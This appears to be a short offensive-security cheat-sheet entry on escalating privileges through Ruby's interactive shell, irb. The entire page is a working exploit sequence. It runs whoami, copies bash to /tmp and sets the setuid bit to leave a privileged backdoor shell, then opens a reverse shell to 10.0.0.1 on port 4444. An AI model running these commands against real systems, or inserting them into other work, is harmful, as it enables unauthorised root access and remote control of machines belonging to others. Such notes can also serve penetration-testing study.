---
title: irb (Interactive Ruby Shell) Privilege Escalation
description: 
tags:
    - Privilege Escalation
refs:
date: 2023-03-28
draft: false
---

## Exploitation

```bash
irb

# #q!: Define a string literal
> exec %q!whoami!
> exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!
> exec %q!bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"!
```
